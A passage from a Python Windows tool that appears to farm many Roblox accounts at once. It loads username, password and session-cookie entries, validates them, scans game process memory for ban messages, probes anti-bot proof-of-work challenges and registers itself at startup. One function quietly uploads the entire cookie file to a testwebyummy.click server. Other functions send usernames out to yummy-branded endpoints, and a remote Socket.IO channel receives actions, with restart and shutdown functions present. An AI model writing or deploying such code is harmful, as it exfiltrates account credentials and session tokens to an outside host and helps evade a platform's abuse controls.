        success(f"Successfully added {exe_name} to startup.")
    except Exception as e:
        error(f"Error: {e}")


def remove_from_startup(exe_name="WebRB"):
    try:
        key = reg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(key, subkey, 0, reg.KEY_WRITE)
        reg.DeleteValue(reg_key, exe_name)
        reg.CloseKey(reg_key)
        success(f"Successfully removed {exe_name} from startup.")
    except Exception as e:
        error(f"Error: {e}")


class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]


class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260),
    ]


def read_memory(process_handle, address, size):
    buffer = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_size_t(0)
    if kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(address), buffer, size, byref(bytes_read)):
        return buffer.raw[: bytes_read.value]
    return b""


def _scan_process_memory_for_needles(proc_name, pid, needles):
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    PAGE_READABLE = (0x02, 0x04, 0x08, 0x20, 0x40, 0x80)
    if pid is None:
        for p in psutil.process_iter(attrs=["pid", "name"]):
            if (p.info.get("name") or "").lower() == proc_name.lower():
                pid = p.info["pid"]
                break
    if not pid:
        return False
    h = k32.OpenProcess(0x0410, False, pid)
    if not h:
        return False
    try:
        addr = 0
        mbi = MEMORY_BASIC_INFORMATION()
        while k32.VirtualQueryEx(h, ctypes.c_void_p(addr), byref(mbi), ctypes.sizeof(mbi)):
            base = mbi.BaseAddress or 0
            size = mbi.RegionSize or 0
            if mbi.State == 0x1000 and (mbi.Protect & 0xFF) in PAGE_READABLE and size > 0:
                off = 0
                while off < size:
                    chunk_sz = min(4194304, size - off)
                    chunk = read_memory(h, base + off, chunk_sz)
                    if chunk:
                        for n in needles:
                            if chunk.find(n) != -1:
                                return True
                    off += chunk_sz
            addr = base + size
    finally:
        k32.CloseHandle(h)
    return False


def scan_for_place_msg(proc_name="robloxplayerbeta.exe", pid=None, place_id=None):
    needles = [
        b"have been permanently banned",
        "have been permanently banned".encode("utf-16le"),
    ]
    if place_id:
        needles.append(str(place_id).encode("utf-8", errors="ignore"))
    return _scan_process_memory_for_needles(proc_name, pid, needles)


_ROBLOX_PROCESS_NAME = "RobloxPlayerBeta.exe"
_ROBLOX_PROCESS_NAME_L = _ROBLOX_PROCESS_NAME.lower()
_ROBLOX_CMDLINE_CACHE_LOCK = threading.Lock()
_ROBLOX_CMDLINE_CACHE_TS = 0.0
_ROBLOX_CMDLINE_CACHE = []


def _cmdline_to_str(cmdline) -> str:
    if isinstance(cmdline, (list, tuple)):
        return " ".join(str(x) for x in cmdline)
    return str(cmdline or "")


def _scan_roblox_process_cmdlines():
    items = []
    for process in psutil.process_iter(attrs=["pid", "name", "cmdline"]):
        try:
            if (process.info.get("name") or "").lower() == _ROBLOX_PROCESS_NAME_L:
                pid = process.info["pid"]
                cmdline = _cmdline_to_str(process.info.get("cmdline"))
                items.append((pid, cmdline))
        except Exception:
            pass
    return items


def _get_roblox_process_cmdlines(ttl=0.5, force=False):
    global _ROBLOX_CMDLINE_CACHE_TS, _ROBLOX_CMDLINE_CACHE
    now = time.monotonic()
    with _ROBLOX_CMDLINE_CACHE_LOCK:
        if not force and (now - _ROBLOX_CMDLINE_CACHE_TS) <= ttl:
            return list(_ROBLOX_CMDLINE_CACHE)
        _ROBLOX_CMDLINE_CACHE = _scan_roblox_process_cmdlines()
        _ROBLOX_CMDLINE_CACHE_TS = now
        return list(_ROBLOX_CMDLINE_CACHE)


def trackrobloxnameandgetpid(username):
    user_id = next((uid for uid, name in browser_to_user_map.items() if name == username), None)
    if not user_id:
        return None
    browser_tracker_id = user_data_map.get(str(user_id))
    if not browser_tracker_id:
        return None
    tracker = str(browser_tracker_id)
    for pid, cmdline in _get_roblox_process_cmdlines():
        if tracker in cmdline:
            return pid
    return None


PROOF_OF_WORK_SKIP_SECONDS = 120
_PROOF_OF_WORK_SKIP = {}
_PROOF_OF_WORK_SKIPPED = set()
_PROOF_OF_WORK_LOCK = threading.Lock()
_PROOF_OF_WORK_PAYLOAD = {
    "gameId": "00000000-0000-0000-0000-000000000000",
    "gameJoinAttemptId": "00000000-0000-0000-0000-000000000000",
    "placeId": 0,
    "gamerTag": "string",
    "isPartyLeader": True,
    "isPlayTogetherGame": True,
    "browserTrackerId": 0,
    "isTeleport": True,
}
_PROOF_OF_WORK_URL = "https://gamejoin.roblox.com/v1/join-game"


def _probe_join_game_request(cookie_value: str) -> str:
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Roblox/WinInetRobloxApp/0.695.0.6950957 (GlobalDist; RobloxDirectDownload)",
        "Cookie": f".ROBLOSECURITY={cookie_value}",
    }
    response = None
    for attempt in range(2):
        try:
            response = requests.post(_PROOF_OF_WORK_URL, headers=headers, json=_PROOF_OF_WORK_PAYLOAD, timeout=8)
            break
        except requests.RequestException:
            if attempt == 0:
                time.sleep(1)
            else:
                return "request_error"
    if response is None:
        return "request_error"
    if response.status_code == 200:
        return "no_captcha"
    challenge_id = response.headers.get("rblx-challenge-id")
    challenge_metadata = response.headers.get("rblx-challenge-metadata")
    challenge_type = (response.headers.get("rblx-challenge-type") or "").strip().lower().replace("-", "")
    if challenge_type:
        return challenge_type
    if challenge_id or challenge_metadata or (
        response.status_code == 403 and "Challenge is required to authorize the request" in response.text
    ):
        return "challenge"
    return f"status_{response.status_code}"


def _should_skip_pid_for_pow(pid, cookie) -> bool:
    key = str(pid)
    now = time.monotonic()
    with _PROOF_OF_WORK_LOCK:
        expire = _PROOF_OF_WORK_SKIP.get(key)
        if expire and now < expire:
            return True
        _PROOF_OF_WORK_SKIP.pop(key, None)
        if key in _PROOF_OF_WORK_SKIPPED:
            return False
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "Content-Type": "application/json",
        "User-Agent": "Roblox/WinInetRobloxApp/0.695.0.6950957 (GlobalDist; RobloxDirectDownload)",
    }
    try:
        response = requests.post(_PROOF_OF_WORK_URL, headers=headers, json=_PROOF_OF_WORK_PAYLOAD, timeout=6)
        if response.status_code == 403:
            ctype = (response.headers.get("rblx-challenge-type") or "").lower()
            if "proofofwork" in ctype:
                with _PROOF_OF_WORK_LOCK:
                    _PROOF_OF_WORK_SKIP[key] = now + PROOF_OF_WORK_SKIP_SECONDS
                    _PROOF_OF_WORK_SKIPPED.add(key)
                purple(f"Proof-of-work challenge detected for PID {pid}. Skipping for {PROOF_OF_WORK_SKIP_SECONDS} seconds.")
                return True
    except requests.RequestException:
        pass
    return False


def checkbannedornot(cookie, placeid):
    url = "https://gamejoin.roblox.com/v1/join-game"
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Roblox",
        "Content-Type": "application/json",
    }
    body = {"placeId": int(placeid) if str(placeid).isdigit() else placeid}
    try:
        response = requests.post(url, headers=headers, data=json.dumps(body), timeout=10)
        if response.status_code == 200:
            data = response.json()
            ban_info = data.get("statusData", {}).get("creatorExperienceBan")
            status = data.get("status")
            message = (data.get("message") or "").lower()
            if ban_info or status == 23 or "banned" in message:
                return True
    except Exception:
        pass
    return False


def check_banned_in_process(cookie, placeid, username):
    result = checkbannedornot(cookie, placeid)
    if result:
        return True
    pid = trackrobloxnameandgetpid(username)
    if pid:
        return scan_for_place_msg(pid=pid, place_id=config.get("PlaceId"))
    return False


def runautoupdate():
    while True:
        getversion = get_webplayer_version()
        if getversion != "ABC":
            warn("Found New Update run update.exe in 3s")
            time.sleep(3)
            run_update_exe(True)
        time.sleep(900)


bannedacc = set()
werbrbs = []


def get_universe_id(place_id):
    url = f"https://apis.roblox.com/universes/v1/places/{place_id}/universe"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get("universeId")
    except Exception:
        pass
    return None


def get_game_name(universe_id):
    if not universe_id:
        return "Unknown"
    url = f"https://games.roblox.com/v1/games?universeIds={universe_id}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json().get("data", [])
            if data:
                return data[0].get("name", "Unknown")
    except Exception:
        pass
    return "Unknown"


def _get_autoexec_folder(cfg):
    custom_dir = str(cfg.get("Custom Exploit Folder", "")).strip()
    if custom_dir and custom_dir != "C:\\Users\\PC\\AppData\\Local\\ui":
        return os.path.join(custom_dir, "autoexec")
    return os.path.join(appdata_path or "", "ui", "autoexec")


def _list_autoexec_files(cfg):
    folder = _get_autoexec_folder(cfg)
    if os.path.isdir(folder):
        try:
            return os.listdir(folder)
        except Exception:
            pass
    return []


def refresh_runtime_config_state(new_config, file_path="config.json"):
    global config, place_id, universe_id, game_name, autoexeclist
    config = apply_workspace_custom_defaults(new_config, file_path)
    place_id = config.get("PlaceId", "")
    universe_id = get_universe_id(place_id)
    game_name = get_game_name(universe_id) or "Unknow"
    autoexeclist = _list_autoexec_files(config)
    return config


totalonline = 0
totaloffline = 0


def check_presence_and_handle():
    global totalonline, totaloffline, werbrbs
    while True:
        current_totalonline = 0
        for valid_cookie in list(valid_cookies):
            username = valid_cookie.get("name")
            pid = trackrobloxnameandgetpid(username)
            is_ingame = pid is not None
            if is_ingame:
                current_totalonline += 1
            existing_entry = next((e for e in werbrbs if e.get("username") == username), None)
            if existing_entry is None:
                werbrbs.append(
                    {
                        "index": len(werbrbs) + 1,
                        "device_name": "Roblox Web",
                        "username": username,
                        "game_name": game_name,
                        "place_id": config.get("PlaceId"),
                        "is_ingame": is_ingame,
                        "info_account": "",
                        "autoexec": autoexeclist,
                    }
                )
            else:
                existing_entry["is_ingame"] = is_ingame
                existing_entry["game_name"] = game_name
                existing_entry["place_id"] = config.get("PlaceId")
                existing_entry["autoexec"] = autoexeclist
        totalonline = current_totalonline
        totaloffline = max(0, len(valid_cookies) - totalonline)
        time.sleep(40)


def send_completed_account_request(username):
    url = "https://api.testwebyummy.click/completed-account"
    payload = {"user_id": auth.get("UserID (UUID)"), "usernames": [username]}
    headers = {"Content-Type": "application/json"}
    try:
        requests.post(url, json=payload, headers=headers, timeout=5)
    except requests.exceptions.RequestException:
        pass


def set_window_title(pid, new_title):
    best_hwnd = None
    best_area = 0

    def enum_windows_callback(hwnd, _):
        nonlocal best_hwnd, best_area
        try:
            _, window_pid = win32process.GetWindowThreadProcessId(hwnd)
            if window_pid == pid and win32gui.GetParent(hwnd) == 0 and win32gui.IsWindowVisible(hwnd):
                if win32gui.GetClassName(hwnd) != "#32770" and win32gui.GetWindow(hwnd, win32con.GW_OWNER) == 0:
                    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
                    area = max(0, right - left) * max(0, bottom - top)
                    if area > best_area:
                        best_area = area
                        best_hwnd = hwnd
        except Exception:
            pass

    try:
        win32gui.EnumWindows(enum_windows_callback, None)
        if best_hwnd:
            win32gui.SetWindowText(best_hwnd, str(new_title))
    except Exception:
        pass


def get_roblox_processes():
    roblox_pids = set()
    for process in psutil.process_iter(attrs=["pid", "name"]):
        try:
            if (process.info.get("name") or "") == "RobloxPlayerBeta.exe":
                roblox_pids.add(process.info["pid"])
        except Exception:
            pass
    return roblox_pids


def _calc_roblox_launch_pause_seconds() -> float:
    count = len(get_roblox_processes())
    if count < 5:
        return 2.0
    if count < 15:
        return 3.0
    return 4.0


def _get_roblox_launch_pause_seconds(cfg) -> float:
    raw = cfg.get("Suspend Roblox After Launch [s]", 0)
    try:
        val = float(raw)
        if val > 0:
            return val
    except Exception:
        pass
    return _calc_roblox_launch_pause_seconds()


def _find_new_roblox_pid(username, baseline_pids, max_wait=8.0, poll=0.2):
    deadline = time.time() + max_wait
    while time.time() < deadline:
        pid = trackrobloxnameandgetpid(username)
        if pid:
            return pid
        current = get_roblox_processes()
        new_pids = current - set(baseline_pids or ())
        if new_pids:
            return next(iter(new_pids))
        time.sleep(poll)
    return None


def _pause_roblox_launch(username, baseline_pids):
    pid = _find_new_roblox_pid(username, baseline_pids)
    if not pid:
        return
    delay = _get_roblox_launch_pause_seconds(config)
    try:
        proc = psutil.Process(pid)
        time.sleep(0.001)
        proc.suspend()
        try:
            time.sleep(delay)
        finally:
            proc.resume()
    except Exception:
        pass


_POW_SKIP_UNTIL = {}


def _pow_skip_active(pid) -> bool:
    now = time.time()
    until = _POW_SKIP_UNTIL.get(pid, 0)
    return now < until


def _mark_pow_skip(pid, seconds=120):
    _POW_SKIP_UNTIL[pid] = time.time() + seconds


cookies_list = []
valid_cookies = []
user_data_map = {}

auth = read_or_create_auth("auth.json")
config = refresh_runtime_config_state(read_or_create_config(auth, "config.json"), "config.json")
if config.get("Auto Delete Temp"):
    threading.Thread(target=auto_delete_temp_loop, args=(300,), daemon=True).start()


def restartroblox():
    while True:
        time.sleep(config.get("Restart Roblox Every [H]", 999) * 60 * 60)
        killproc()


# ============================================================================
# Cookie Management, Domain Resolution, & Window Helpers
# ============================================================================

def filter_unprocessed_usernames(
    input_file="switched/storeddata.txt",
    output_file="switched/not_in_changeacc.txt",
):
    existing_usernames = set()
    if os.path.exists(input_file):
        with open(input_file, "r", encoding="utf-8-sig", errors="ignore") as file:
            for line in file:
                existing_usernames.add(line.strip().split(" - ")[0].strip())
    new_lines = []
    for entry in cookies_list:
        parts = entry.split(":")
        if parts and parts[0] not in existing_usernames and entry not in dead_cookies:
            new_lines.append(entry + "\n")
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    with open(output_file, "w", encoding="utf-8-sig") as file:
        file.writelines(new_lines)


CLONES = []


def read_cookie_file(file_path):
    global cookies_list
    cookies_list.clear()
    added_entries = set()

    def process_file(path):
        if not os.path.exists(path):
            return
        with open(path, "r", encoding="utf-8-sig", errors="ignore") as file:
            lines = file.readlines()
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if "|WARNING" in line and ":" in line:
                parts = line.split(":", 2)
                if len(parts) == 3:
                    user, password, cookie = parts
                elif len(parts) == 2:
                    user, cookie = parts
                    password = "NotFound"
                else:
                    continue
                entry = f"{user}:{password}:{cookie}"
                if entry not in added_entries:
                    added_entries.add(entry)
                    cookies_list.append(entry)

    process_file(file_path)


setusername = set()
processed_ck_set = set()
valid_cookies_trimmed = []
dead_cookies = set()
dead_cookies_is_cookie = set()
discordid = 123
totaldeadcookie = 0
total_timeout = 0

try:
    user_id = auth.get("UserID (UUID)")
    response = requests.get(
        "https://api.testwebyummy.click/get-discordid",
        params={"user_id": user_id},
        timeout=7,
    )
    response.raise_for_status()
    discordid = response.json().get("discord_id", 123)
except Exception:
    discordid = 123


def resolve_domain(domain: str):
    try:
        import dns.resolver

        resolver = dns.resolver.Resolver()
        resolver.nameservers = ["1.1.1.1"]
        resolver.timeout = 5
        resolver.lifetime = 10
        answers = resolver.resolve(domain, "A")
        return answers[0].to_text()
    except Exception:
        return None


cookie_cache = {}
dead_cookie_cache = set()


def read_switched_usernames():
    if not os.path.exists("switched/storeddata.txt"):
        return set()
    with open("switched/storeddata.txt", "r", encoding="utf-8-sig", errors="ignore") as file:
        return {line.strip().split(" - ")[0].strip() for line in file if line.strip()}


def quick_check_cookie(session, cookie):
    try:
        response = session.post(
            "https://apis.roblox.com/user-profile-api/v1/user/profiles/get-profiles",
            cookies={".ROBLOSECURITY": cookie},
            timeout=7,
        )
        if response.status_code == 200:
            return True
        if response.status_code == 401:
            return False
    except Exception:
        pass
    return None


def check_cookie(thread_count=30, refresh_switched=False):
    global valid_cookies, valid_cookies_trimmed, totaldeadcookie
    read_cookie_file("cookie.txt")
    switched_usernames = read_switched_usernames()
    valid_cookies_trimmed = []
    session = requests.Session()
    session.headers.update(
        {"User-Agent": "Roblox/WinInetRobloxApp/0.695.0.6950957 (GlobalDist; RobloxDirectDownload)"}
    )
    target_instances = config.get("Total Instance", 30)

    for entry in cookies_list:
        if len(valid_cookies_trimmed) >= target_instances:
            break
        parts = entry.split(":", 2)
        if len(parts) < 3:
            continue
        name, password, cookie = parts[0], parts[1], parts[2]
        if name in switched_usernames or name in bannedacc or cookie in dead_cookie_cache:
            continue
        if cookie in cookie_cache:
            cached = cookie_cache[cookie]
            if quick_check_cookie(session, cookie) is not False:
                valid_cookies_trimmed.append(cached)
                setusername.add(cached["name"])
                browser_to_user_map[cached["id"]] = cached["name"]
                continue
            else:
                dead_cookie_cache.add(cookie)
                savedeadcookie(entry)
                continue
        try:
            resp = session.get(
                "https://users.roblox.com/v1/users/authenticated",
                cookies={".ROBLOSECURITY": cookie},
                timeout=7,
            )
            if resp.status_code == 200:
                data = resp.json()
                uid = data.get("id", "Unknown")
                uname = data.get("name", name)
                item = {
                    "name": uname,
                    "cookie": cookie,
                    "id": uid,
                    "privateserver": "",
                    "defaultck": entry,
                }
                cookie_cache[cookie] = item
                valid_cookies_trimmed.append(item)
                setusername.add(uname)
                browser_to_user_map[uid] = uname
            elif resp.status_code == 401:
                totaldeadcookie += 1
                dead_cookies.add(entry)
                dead_cookie_cache.add(cookie)
                savedeadcookie(entry)
        except Exception:
            pass

    if os.path.exists("stored/privateserver.txt"):
        with open("stored/privateserver.txt", "r", encoding="utf-8-sig") as f:
            ps_lines = [l.strip() for l in f.readlines() if l.strip()]
        for idx, vc in enumerate(valid_cookies_trimmed):
            if idx < len(ps_lines):
                vc["privateserver"] = ps_lines[idx]

    valid_cookies = list(valid_cookies_trimmed[:target_instances])
    filter_unprocessed_usernames()
    return valid_cookies


def save_user_data(file_path="stored/savedata.txt"):
    existing_data = {}
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8-sig") as file:
            for line in file:
                parts = line.strip().split(":", 1)
                if len(parts) == 2:
                    existing_data[parts[0]] = parts[1]
    existing_data.update({str(k): str(v) for k, v in user_data_map.items()})
    with open(file_path, "w", encoding="utf-8-sig") as file:
        for uid, btid in existing_data.items():
            file.write(f"{uid}:{btid}\n")


def handle_multi_game():
    multi_file = "stored/multi-games.json"
    default_pid = config.get("PlaceId", "")
    os.makedirs("stored", exist_ok=True)

    def _atomic_write(path, data):
        tmp = f"{path}.tmp"
        with open(tmp, "w", encoding="utf-8-sig") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        os.replace(tmp, path)

    existing = []
    if os.path.exists(multi_file) and os.path.getsize(multi_file) > 0:
        try:
            with open(multi_file, "r", encoding="utf-8-sig") as f:
                existing = json.load(f)
        except Exception:
            existing = []
    existing_map = {e.get("name"): e for e in existing if isinstance(e, dict) and e.get("name")}
    updated = []
    for ck in valid_cookies:
        name = ck.get("name")
        entry = existing_map.get(
            name,
            {
                "name": name,
                "is_multi": False,
                "placeid": default_pid,
                "privateserver": ck.get("privateserver", ""),
            },
        )
        updated.append(entry)
    _atomic_write(multi_file, updated)
    return updated


def kill_heavy_processes(process_name, ram_threshold):
    for process in psutil.process_iter(attrs=["pid", "name", "memory_info"]):
        try:
            if (process.info.get("name") or "") == process_name:
                rss = process.info["memory_info"].rss
                if rss > ram_threshold * 1024 * 1024:
                    info(f"Killing process {process_name} (PID: {process.info['pid']}) using {rss / 1073741824:.2f} GB RAM.")
                    os.kill(process.info["pid"], 9)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass


browser_to_user_map = {}


def killgheavyprocess():
    while True:
        kill_heavy_processes("RobloxPlayerBeta.exe", config.get("Ram Usage (Each Process)", 3) * 1024)
        time.sleep(120)


def load_user_data(file_path="stored/savedata.txt"):
    if not os.path.exists(file_path):
        error(f"File not found: {file_path}")
        return
    with open(file_path, "r", encoding="utf-8-sig") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                user_id, browser_tracker_id = line.split(":", 1)
                user_data_map[user_id] = browser_tracker_id


EnumWindows = ctypes.windll.user32.EnumWindows
EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
GetWindowText = ctypes.windll.user32.GetWindowTextW
GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
IsWindowVisible = ctypes.windll.user32.IsWindowVisible
PostMessage = ctypes.windll.user32.PostMessageW
WM_CLOSE = 0x0010
PROCESS_TERMINATE = 0x0001


def get_all_windows():
    windows = []

    def foreach_window(hwnd, lParam):
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                GetWindowText(hwnd, buff, length + 1)
                windows.append((hwnd, buff.value))
        return True

    EnumWindows(EnumWindowsProc(foreach_window), 0)
    return windows


def force_close_window(hwnd):
    pid = wintypes.DWORD()
    ctypes.windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_handle = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid.value)
    if process_handle:
        kernel32.TerminateProcess(process_handle, -1)
        kernel32.CloseHandle(process_handle)


def close_specific_windows(titles_to_close):
    last_roblox_check = 0
    while True:
        try:
            for hwnd, title in get_all_windows():
                if any(t.lower() == title.lower() for t in titles_to_close):
                    PostMessage(hwnd, WM_CLOSE, 0, 0)
                    time.sleep(1)
                    if ctypes.windll.user32.IsWindow(hwnd):
                        info(f"Window {title} did not close gracefully, closing process error.")
                        force_close_window(hwnd)
            if config.get("Display Username"):
                track_and_manage_roblox_process()
            if not config.get("Disable Kill Suspended Roblox") and (time.time() - last_roblox_check) >= 180:
                last_roblox_check = time.time()
                for proc in psutil.process_iter(attrs=["pid", "name", "status"]):
                    try:
                        if (proc.info.get("name") or "").lower() == "robloxplayerbeta.exe":
                            if proc.info.get("status") == psutil.STATUS_STOPPED:
                                info(
                                    f"Process RobloxPlayerBeta.exe (PID {proc.info['pid']}) "
                                    "is suspended or not responding, terminating."
                                )
                                proc.terminate()
                    except Exception:
                        pass
        except Exception:
            pass
        time.sleep(30)


def monitor_and_run_fps_unlocker():
    while True:
        try:
            folder_path = config.get("Fps Unlocker Folder", "")
            exe_path = os.path.join(folder_path, "rbxfpsunlocker.exe")
            if os.path.exists(exe_path):
                running = any(
                    (p.info.get("name") or "").lower() == "rbxfpsunlocker.exe"
                    for p in psutil.process_iter(attrs=["name"])
                )
                if not running:
                    info("rbxfpsunlocker.exe is not running. Starting it...")
                    subprocess.Popen(exe_path, shell=True, cwd=folder_path)
        except Exception as e:
            error(f"Error starting rbxfpsunlocker.exe: {e}")
        time.sleep(5)


def openfpsuncloker():
    monitor_and_run_fps_unlocker()


def check_and_kill_roblox_process():
    if config.get("Use With RobloxAccManager"):
        return
    valid_ids = {str(vc.get("id")) for vc in valid_cookies}
    tracked_browser_ids = {
        str(btid) for uid, btid in user_data_map.items() if str(uid) in valid_ids and str(btid).isdigit()
    }
    for pid, cmdline in _get_roblox_process_cmdlines():
        if not any(bid in cmdline for bid in tracked_browser_ids):
            try:
                p = psutil.Process(pid)
                if p.name().lower() == _ROBLOX_PROCESS_NAME_L:
                    p.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    gc.collect()


def post_import_account():
    url = "https://whitelist.testwebyummy.click/import-account"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    }
    data = {"user_id": auth.get("UserID (UUID)"), "discord_id": discordid}
    if not os.path.exists("cookie.txt"):
        error("File cookie not found")
        return
    try:
        with open("cookie.txt", "rb") as f:
            merged_content = f.read()
        files = {"filepond": ("merged_cookie.txt", merged_content)}
        requests.post(url, headers=headers, data=data, files=files, timeout=10)
    except requests.exceptions.RequestException:
        pass


def get_usernames_from_file(filename):
    usernames = []
    if os.path.exists(filename):
        with open(filename, "r", encoding="utf-8", errors="ignore") as file:
            for line in file:
                parts = line.strip().split(":")
                if parts and parts[0]:
                    usernames.append(parts[0])
    return usernames


def get_all_usernames():
    return get_usernames_from_file("cookie.txt")


def post_imported_account():
    url = "https://api.testwebyummy.click/imported-account"
    usernames = get_all_usernames()
    data = {"user_id": auth.get("UserID (UUID)"), "usernames": usernames}
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
    }
    try:
        requests.post(url, json=data, headers=headers, timeout=10)
    except requests.exceptions.RequestException:
        pass


def track_and_manage_roblox_process():
    browser_id_to_user_id = {str(v): str(k) for k, v in user_data_map.items()}
    for pid, cmdline in _get_roblox_process_cmdlines():
        try:
            for browser_id, user_id in browser_id_to_user_id.items():
                if browser_id in cmdline:
                    name = browser_to_user_map.get(int(user_id)) or browser_to_user_map.get(user_id)
                    if name:
                        set_window_title(pid, name)
        except Exception as e:
            error(f"Error processing process: {e}")


def trackrobloxnameandkill(username):
    user_id = next((uid for uid, name in browser_to_user_map.items() if name == username), None)
    if not user_id:
        return
    browser_tracker_id = user_data_map.get(str(user_id))
    if not browser_tracker_id:
        return
    tracker = str(browser_tracker_id)
    for pid, cmdline in _get_roblox_process_cmdlines(force=True):
        if tracker in cmdline:
            try:
                p = psutil.Process(pid)
                if p.name().lower() == _ROBLOX_PROCESS_NAME_L:
                    p.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
            except Exception as e:
                error(f"Error processing process: {e}")


def check_captcha(username):
    with _CAPTCHA_USERS_LOCK:
        if username in _CAPTCHA_USERS:
            _CAPTCHA_USERS.discard(username)
            return True
    return False


def restart_pc():
    subprocess.run(["shutdown", "/r", "/t", "0", "/f"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def shutdown_pc():
    subprocess.run(["C:\\Windows\\System32\\shutdown.exe", "/s", "/t", "0", "/f"], capture_output=True, text=True)


# ============================================================================
# Telemetry & Socket.IO Client (`SIOThreadClient`)
# ============================================================================

def _dump_response(tag: str, resp):
    try:
        if resp is None:
            logging.error(f"[{tag}] response=None")
            return
        sc = getattr(resp, "status_code", None)
        tx = (getattr(resp, "text", "") or "")[:1500]
        logging.error(f"[{tag}] HTTP {sc} -> {tx}")
    except Exception:
        logging.error(f"[{tag}] dump_response failed", exc_info=True)


PLACE_SUBDOMAIN_MAP = {
    "920587237": "am",
    "2753915549": "bf2",
    "4442272183": "bf2",
    "7449423635": "bf2",
    "8737899170": "pet99",
    "16498369169": "pet99",
    "17503543197": "pet99",
    "84810042603306": "pet99",
    "85896571713843": "bgsi",
    "126884695634066": "gag",
    "109983668079237": "sab",
    "79546208627805": "night99",
    "80469437126309": "mm2",
}


def post_minimal_user(
    place_id,
    user_id,
    username,
    discord_id,
    note,
    base_url=None,
    timeout=5,
    retries=0,
    retry_sleep=1.0,
    session=None,
):
    sub = PLACE_SUBDOMAIN_MAP.get(str(place_id))
    if not sub:
        return None
    if sub == "mm2":
        url = "https://api-mm2.yummywhitelist.click/mm2"
    elif sub in ("sab", "fishit", "night99"):
        url = "https://api-sab.yummydata.click/sab"
    elif sub in ("pet99", "pvb"):
        url = "https://api-pet99.yummydata.click/pet99"
    else:
        url = f"https://api-{sub}.yummydata.click/{sub}"
    payload = {
        "user_id": str(user_id),
        "username": str(username),
        "discord_id": str(discord_id),
        "note": str(note),
    }
    headers = {"Content-Type": "application/json", "User-Agent": "YummyAuto/1.0"}
    sess = session or requests.Session()
    try:
        return sess.post(url, json=payload, headers=headers, timeout=timeout)
    except Exception:
        return None


def _extract_actions(payload):
    out = []
    if isinstance(payload, dict):
        for k in ("actions", "action_types", "action_type", "action"):
            v = payload.get(k)
            if isinstance(v, (list, tuple)):
                out.extend(str(x).strip() for x in v if str(x).strip())
            elif isinstance(v, str):
                out.extend(p.strip() for p in v.replace("\n", ",").split(",") if p.strip())
    return out


class SIOThreadClient:
    def __init__(
        self,
        base_url="https://connection.testwebyummy.click",
        user_id=None,
        user_key=None,
        on_action=None,
        on_error=None,
        wait_timeout=30,
    ):
        self.base_url = base_url
        self.user_id = str(user_id or auth.get("UserID (UUID)", "")).strip()
        self.user_key = str(user_key or auth.get("Key", "")).strip()
        self.auth = {"user_id": self.user_id, "user_key": self.user_key}
        self.on_action = on_action
        self.on_error = on_error
        self.wait_timeout = wait_timeout
        self.socketio_paths = ["/socket.io/", "/socket.io", "socket.io"]
        self.transports_matrix = [["websocket"], None]
        self.thread = None
        self.loop = None
        self.client = None
        self._stop_flag = threading.Event()
        self._started = threading.Event()
        self._stop_async = None
        self._http = None
        self._incoming_event_name = None

    def start(self, daemon=True):
        if self.thread and self.thread.is_alive():
            return
        self.thread = threading.Thread(target=self._run_loop, daemon=daemon)
        self.thread.start()
        self._started.wait(timeout=5)

    def stop(self, timeout=5):
        self._stop_flag.set()
        if self.loop:
            def _signal():
                if self._stop_async and not self._stop_async.is_set():
                    self._stop_async.set()
                if self.client and self.client.connected:
                    self.loop.create_task(self._force_disconnect(self.client))

            self.loop.call_soon_threadsafe(_signal)
        if self.thread:
            self.thread.join(timeout=timeout)

    @property
    def is_running(self):
        return bool(self.thread and self.thread.is_alive())

    def _run_loop(self):
        self.loop = asyncio.new_event_loop()
